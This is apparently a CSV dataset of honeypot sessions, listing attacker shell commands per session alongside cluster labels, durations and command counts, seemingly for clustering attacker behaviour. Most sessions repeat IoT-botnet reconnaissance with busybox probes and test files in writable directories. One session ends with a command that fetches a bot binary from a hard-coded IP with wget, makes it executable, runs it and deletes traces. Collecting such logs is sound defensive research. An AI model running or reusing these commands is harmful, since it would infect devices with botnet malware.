session,PCKmeans_exp_result,Unnamed: 0,duration,command_freq,input
e77109ef96fd,2,128,2.777678489685058,13,/bin/busybox KIHZA
e77109ef96fd,2,129,2.777678489685058,13,rm .s; exit
d3ece9366a18,2,130,9.004159927368164,13,enable
d3ece9366a18,2,131,9.004159927368164,13,system
d3ece9366a18,2,132,9.004159927368164,13,system
d3ece9366a18,2,133,9.004159927368164,13,shell
d3ece9366a18,2,134,9.004159927368164,13,shell
d3ece9366a18,2,135,9.004159927368164,13,sh
d3ece9366a18,2,136,9.004159927368164,13,cat /proc/mounts; /bin/busybox JOKGF
d3ece9366a18,2,137,9.004159927368164,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JOKGF
d3ece9366a18,2,138,9.004159927368164,13,tftp; wget; /bin/busybox JOKGF
d3ece9366a18,2,139,9.004159927368164,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
d3ece9366a18,2,140,9.004159927368164,13,while read i
d3ece9366a18,2,141,9.004159927368164,13,/bin/busybox JOKGF
d3ece9366a18,2,142,9.004159927368164,13,rm .s; exit
0540a14cc9ef,2,143,4.336338520050049,13,enable
0540a14cc9ef,2,144,4.336338520050049,13,system
0540a14cc9ef,2,145,4.336338520050049,13,system
0540a14cc9ef,2,146,4.336338520050049,13,shell
0540a14cc9ef,2,147,4.336338520050049,13,shell
0540a14cc9ef,2,148,4.336338520050049,13,sh
0540a14cc9ef,2,149,4.336338520050049,13,cat /proc/mounts; /bin/busybox JKDOP
0540a14cc9ef,2,150,4.336338520050049,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JKDOP
0540a14cc9ef,2,151,4.336338520050049,13,tftp; wget; /bin/busybox JKDOP
0540a14cc9ef,2,152,4.336338520050049,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
0540a14cc9ef,2,153,4.336338520050049,13,while read i
0540a14cc9ef,2,154,4.336338520050049,13,/bin/busybox JKDOP
0540a14cc9ef,2,155,4.336338520050049,13,rm .s; exit
239f93542791,2,156,18.20142102241516,13,enable
239f93542791,2,157,18.20142102241516,13,system
239f93542791,2,158,18.20142102241516,13,system
239f93542791,2,159,18.20142102241516,13,shell
239f93542791,2,160,18.20142102241516,13,shell
239f93542791,2,161,18.20142102241516,13,sh
239f93542791,2,162,18.20142102241516,13,cat /proc/mounts; /bin/busybox IWMTP
239f93542791,2,163,18.20142102241516,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox IWMTP
239f93542791,2,164,18.20142102241516,13,tftp; wget; /bin/busybox IWMTP
239f93542791,2,165,18.20142102241516,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
239f93542791,2,166,18.20142102241516,13,while read i
239f93542791,2,167,18.20142102241516,13,/bin/busybox IWMTP
239f93542791,2,168,18.20142102241516,13,rm .s; exit
c226f05f05d8,1,169,112.84874820709229,9,/ip cloud print
c226f05f05d8,1,170,112.84874820709229,9,/ip cloud print
c226f05f05d8,1,171,112.84874820709229,9,ifconfig
c226f05f05d8,1,172,112.84874820709229,9,uname -a
c226f05f05d8,1,173,112.84874820709229,9,cat /proc/cpuinfo
c226f05f05d8,1,174,112.84874820709229,9,ps | grep '[Mm]iner'
c226f05f05d8,1,175,112.84874820709229,9,ps -ef | grep '[Mm]iner'
c226f05f05d8,1,176,112.84874820709229,9,ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
c226f05f05d8,1,177,112.84874820709229,9,echo Hi | cat -n
1b1db78aec94,2,178,1.274125814437866,13,enable
1b1db78aec94,2,179,1.274125814437866,13,system
1b1db78aec94,2,180,1.274125814437866,13,system
1b1db78aec94,2,181,1.274125814437866,13,shell
1b1db78aec94,2,182,1.274125814437866,13,shell
1b1db78aec94,2,183,1.274125814437866,13,sh
1b1db78aec94,2,184,1.274125814437866,13,cat /proc/mounts; /bin/busybox GMNWA
1b1db78aec94,2,185,1.274125814437866,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox GMNWA
1b1db78aec94,2,186,1.274125814437866,13,tftp; wget; /bin/busybox GMNWA
1b1db78aec94,2,187,1.274125814437866,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
1b1db78aec94,2,188,1.274125814437866,13,while read i
1b1db78aec94,2,189,1.274125814437866,13,/bin/busybox GMNWA
1b1db78aec94,2,190,1.274125814437866,13,rm .s; exit
d77ffde64c08,2,191,4.022591114044189,13,enable
d77ffde64c08,2,192,4.022591114044189,13,system
d77ffde64c08,2,193,4.022591114044189,13,system
d77ffde64c08,2,194,4.022591114044189,13,shell
d77ffde64c08,2,195,4.022591114044189,13,shell
d77ffde64c08,2,196,4.022591114044189,13,sh
d77ffde64c08,2,197,4.022591114044189,13,cat /proc/mounts; /bin/busybox PCSHC
d77ffde64c08,2,198,4.022591114044189,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PCSHC
d77ffde64c08,2,199,4.022591114044189,13,tftp; wget; /bin/busybox PCSHC
d77ffde64c08,2,200,4.022591114044189,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
d77ffde64c08,2,201,4.022591114044189,13,while read i
d77ffde64c08,2,202,4.022591114044189,13,/bin/busybox PCSHC
d77ffde64c08,2,203,4.022591114044189,13,rm .s; exit
efef1f4f9c64,2,204,0.8046431541442871,13,enable
efef1f4f9c64,2,205,0.8046431541442871,13,system
efef1f4f9c64,2,206,0.8046431541442871,13,system
efef1f4f9c64,2,207,0.8046431541442871,13,shell
efef1f4f9c64,2,208,0.8046431541442871,13,shell
efef1f4f9c64,2,209,0.8046431541442871,13,sh
efef1f4f9c64,2,210,0.8046431541442871,13,cat /proc/mounts; /bin/busybox WGWWW
efef1f4f9c64,2,211,0.8046431541442871,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WGWWW
efef1f4f9c64,2,212,0.8046431541442871,13,tftp; wget; /bin/busybox WGWWW
efef1f4f9c64,2,213,0.8046431541442871,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
efef1f4f9c64,2,214,0.8046431541442871,13,while read i
efef1f4f9c64,2,215,0.8046431541442871,13,/bin/busybox WGWWW
efef1f4f9c64,2,216,0.8046431541442871,13,rm .s; exit
9d93ddb044c7,1,217,12.278405904769896,5,sh
9d93ddb044c7,1,218,12.278405904769896,5,shell
9d93ddb044c7,1,219,12.278405904769896,5,shell
9d93ddb044c7,1,220,12.278405904769896,5,help
9d93ddb044c7,1,221,12.278405904769896,5,busybox
f494d2afc575,2,222,1.455475091934204,13,enable
f494d2afc575,2,223,1.455475091934204,13,system
f494d2afc575,2,224,1.455475091934204,13,system
f494d2afc575,2,225,1.455475091934204,13,shell
f494d2afc575,2,226,1.455475091934204,13,shell
f494d2afc575,2,227,1.455475091934204,13,sh
f494d2afc575,2,228,1.455475091934204,13,cat /proc/mounts; /bin/busybox NUXWH
f494d2afc575,2,229,1.455475091934204,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NUXWH
f494d2afc575,2,230,1.455475091934204,13,tftp; wget; /bin/busybox NUXWH
f494d2afc575,2,231,1.455475091934204,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
f494d2afc575,2,232,1.455475091934204,13,while read i
f494d2afc575,2,233,1.455475091934204,13,/bin/busybox NUXWH
f494d2afc575,2,234,1.455475091934204,13,rm .s; exit
e74b9f58c370,2,235,1.079039573669433,13,enable
e74b9f58c370,2,236,1.079039573669433,13,system
e74b9f58c370,2,237,1.079039573669433,13,system
e74b9f58c370,2,238,1.079039573669433,13,shell
e74b9f58c370,2,239,1.079039573669433,13,shell
e74b9f58c370,2,240,1.079039573669433,13,sh
e74b9f58c370,2,241,1.079039573669433,13,cat /proc/mounts; /bin/busybox YCYDS
e74b9f58c370,2,242,1.079039573669433,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YCYDS
e74b9f58c370,2,243,1.079039573669433,13,tftp; wget; /bin/busybox YCYDS
e74b9f58c370,2,244,1.079039573669433,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
e74b9f58c370,2,245,1.079039573669433,13,while read i
e74b9f58c370,2,246,1.079039573669433,13,/bin/busybox YCYDS
e74b9f58c370,2,247,1.079039573669433,13,rm .s; exit
701864b90d35,1,248,80.14842939376831,9,/ip cloud print
701864b90d35,1,249,80.14842939376831,9,/ip cloud print
701864b90d35,1,250,80.14842939376831,9,ifconfig
701864b90d35,1,251,80.14842939376831,9,uname -a
701864b90d35,1,252,80.14842939376831,9,cat /proc/cpuinfo
701864b90d35,1,253,80.14842939376831,9,ps | grep '[Mm]iner'
701864b90d35,1,254,80.14842939376831,9,ps -ef | grep '[Mm]iner'
701864b90d35,1,255,80.14842939376831,9,ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
701864b90d35,1,256,80.14842939376831,9,echo Hi | cat -n
3bed27ba4719,2,257,5.75736665725708,13,enable
3bed27ba4719,2,258,5.75736665725708,13,system
3bed27ba4719,2,259,5.75736665725708,13,system
3bed27ba4719,2,260,5.75736665725708,13,shell
3bed27ba4719,2,261,5.75736665725708,13,shell
3bed27ba4719,2,262,5.75736665725708,13,sh
3bed27ba4719,2,263,5.75736665725708,13,cat /proc/mounts; /bin/busybox RGIUA
3bed27ba4719,2,264,5.75736665725708,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RGIUA
3bed27ba4719,2,265,5.75736665725708,13,tftp; wget; /bin/busybox RGIUA
3bed27ba4719,2,266,5.75736665725708,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
3bed27ba4719,2,267,5.75736665725708,13,while read i
3bed27ba4719,2,268,5.75736665725708,13,/bin/busybox RGIUA
3bed27ba4719,2,269,5.75736665725708,13,rm .s; exit
a008676b9e73,2,270,1.092103242874145,13,enable
a008676b9e73,2,271,1.092103242874145,13,system
a008676b9e73,2,272,1.092103242874145,13,system
a008676b9e73,2,273,1.092103242874145,13,shell
a008676b9e73,2,274,1.092103242874145,13,shell
a008676b9e73,2,275,1.092103242874145,13,sh
a008676b9e73,2,276,1.092103242874145,13,cat /proc/mounts; /bin/busybox RITPX
a008676b9e73,2,277,1.092103242874145,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RITPX
a008676b9e73,2,278,1.092103242874145,13,tftp; wget; /bin/busybox RITPX
a008676b9e73,2,279,1.092103242874145,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
a008676b9e73,2,280,1.092103242874145,13,while read i
a008676b9e73,2,281,1.092103242874145,13,/bin/busybox RITPX
a008676b9e73,2,282,1.092103242874145,13,rm .s; exit
aaff7f4f9a57,2,283,4.84981894493103,13,enable
aaff7f4f9a57,2,284,4.84981894493103,13,system
aaff7f4f9a57,2,285,4.84981894493103,13,system
aaff7f4f9a57,2,286,4.84981894493103,13,shell
aaff7f4f9a57,2,287,4.84981894493103,13,shell
aaff7f4f9a57,2,288,4.84981894493103,13,sh
aaff7f4f9a57,2,289,4.84981894493103,13,cat /proc/mounts; /bin/busybox FJUKH
aaff7f4f9a57,2,290,4.84981894493103,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox FJUKH
aaff7f4f9a57,2,291,4.84981894493103,13,tftp; wget; /bin/busybox FJUKH
aaff7f4f9a57,2,292,4.84981894493103,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
aaff7f4f9a57,2,293,4.84981894493103,13,while read i
aaff7f4f9a57,2,294,4.84981894493103,13,/bin/busybox FJUKH
aaff7f4f9a57,2,295,4.84981894493103,13,rm .s; exit
d5672d611002,1,296,2.672670841217041,4,shell
d5672d611002,1,297,2.672670841217041,4,shell
d5672d611002,1,298,2.672670841217041,4,sh
d5672d611002,1,299,2.672670841217041,4,cat /bin/busybox
e5840e902c93,2,300,1.659119844436645,13,enable
e5840e902c93,2,301,1.659119844436645,13,system
e5840e902c93,2,302,1.659119844436645,13,system
e5840e902c93,2,303,1.659119844436645,13,shell
e5840e902c93,2,304,1.659119844436645,13,shell
e5840e902c93,2,305,1.659119844436645,13,sh
e5840e902c93,2,306,1.659119844436645,13,cat /proc/mounts; /bin/busybox QKQVW
e5840e902c93,2,307,1.659119844436645,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QKQVW
e5840e902c93,2,308,1.659119844436645,13,tftp; wget; /bin/busybox QKQVW
e5840e902c93,2,309,1.659119844436645,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
e5840e902c93,2,310,1.659119844436645,13,while read i
e5840e902c93,2,311,1.659119844436645,13,/bin/busybox QKQVW
e5840e902c93,2,312,1.659119844436645,13,rm .s; exit
e8ba1750cf5d,1,313,2.440993070602417,4,shell
e8ba1750cf5d,1,314,2.440993070602417,4,shell
e8ba1750cf5d,1,315,2.440993070602417,4,sh
e8ba1750cf5d,1,316,2.440993070602417,4,cat /bin/busybox
1e57b6232ff2,0,317,21.12516522407532,26,shell
1e57b6232ff2,0,318,21.12516522407532,26,shell
1e57b6232ff2,0,319,21.12516522407532,26,sh
1e57b6232ff2,0,320,21.12516522407532,26,>/tmp/.l && cd /tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,0,321,21.12516522407532,26,>/run//var/.l && cd /run//var/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,0,322,21.12516522407532,26,>/dev/.l && cd /dev/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,0,323,21.12516522407532,26,>/mnt/.l && cd /mnt/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,0,324,21.12516522407532,26,>/sys/fs/user/.l && cd /sys/fs/user/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,0,328,21.12516522407532,26,>/usr/.l && cd /usr/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,0,330,21.12516522407532,26,>/temp/.l && cd /temp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,0,331,21.12516522407532,26,>/data/local/tmp/.l && cd /data/local/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,0,332,21.12516522407532,26,>/local/.l && cd /local/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,0,333,21.12516522407532,26,>/sys/.l && cd /sys/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,0,334,21.12516522407532,26,>/etc/.l && cd /etc/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,0,335,21.12516522407532,26,>/media/.l && cd /media/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,0,336,21.12516522407532,26,>/www/.l && cd /www/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,0,337,21.12516522407532,26,>/var/tmp/.l && cd /var/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,0,338,21.12516522407532,26,>/dev/shm/.l && cd /dev/shm/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,0,339,21.12516522407532,26,>/dev/netslink/.l && cd /dev/netslink/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,0,340,21.12516522407532,26,>/boot/.l && cd /boot/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,0,341,21.12516522407532,26,/bin/busybox wget || wget; /bin/busybox tftp || tftp; /bin/busybox ftpget || ftpget; echo -en '\x45\x43\x48\x4f\x5f\x44\x4f\x4e\x45'
1e57b6232ff2,0,342,21.12516522407532,26,wget
1e57b6232ff2,0,343,21.12516522407532,26,tftp
1e57b6232ff2,0,344,21.12516522407532,26,ftpget
1e57b6232ff2,0,345,21.12516522407532,26,/bin/busybox wget http://185.243.56.167/bot_ia_64_el -O- > .f; chmod 777 .f || (cp /proc/self/exe .m && > .m && cat .f > .m && (rm -rf .f || rm .f) && cp .m .f && (rm -rf .m || rm .f)); ./.f wget.ia_64; (rm -rf .f || rm .f); (rm -rf .m || rm .m)
1e57b6232ff2,0,346,21.12516522407532,26,wget http://185.243.56.167/bot_ia_64_el -O-
5817f66fd82a,1,325,2.436866998672485,4,shell
5817f66fd82a,1,326,2.436866998672485,4,shell
5817f66fd82a,1,327,2.436866998672485,4,sh
5817f66fd82a,1,329,2.436866998672485,4,cat /bin/busybox
ed40208d2bbc,1,347,2.408712387084961,4,shell
ed40208d2bbc,1,348,2.408712387084961,4,shell
ed40208d2bbc,1,349,2.408712387084961,4,sh
ed40208d2bbc,1,350,2.408712387084961,4,cat /bin/busybox
ce2d6c9a590a,0,351,21.06158757209778,26,shell
ce2d6c9a590a,0,352,21.06158757209778,26,shell
ce2d6c9a590a,0,353,21.06158757209778,26,sh
